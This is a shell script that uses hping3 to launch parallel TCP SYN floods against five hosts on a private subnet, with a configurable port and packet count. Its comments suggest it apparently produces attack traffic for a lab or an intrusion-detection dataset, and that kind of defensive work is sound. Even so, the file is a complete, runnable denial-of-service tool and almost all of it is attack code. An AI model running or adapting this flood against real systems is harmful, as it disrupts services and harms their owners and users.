#!/bin/sh
# syn_flood.sh — TCP SYN flood against all victim nodes.
# Generates high syn_flag_ratio flows with short duration and zero response.
# -k keeps the same source port so all packets per target belong to one flow.
# All 5 nodes targeted in parallel — realistic subnet-wide DoS campaign.
PORT=${1:-80}
COUNT=${2:-10000}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] SYN flood -> all nodes  port $PORT  ($COUNT packets each)"
for ip in $VICTIMS; do
    hping3 --syn -k -p "$PORT" -c "$COUNT" --faster "$ip" &
done
wait
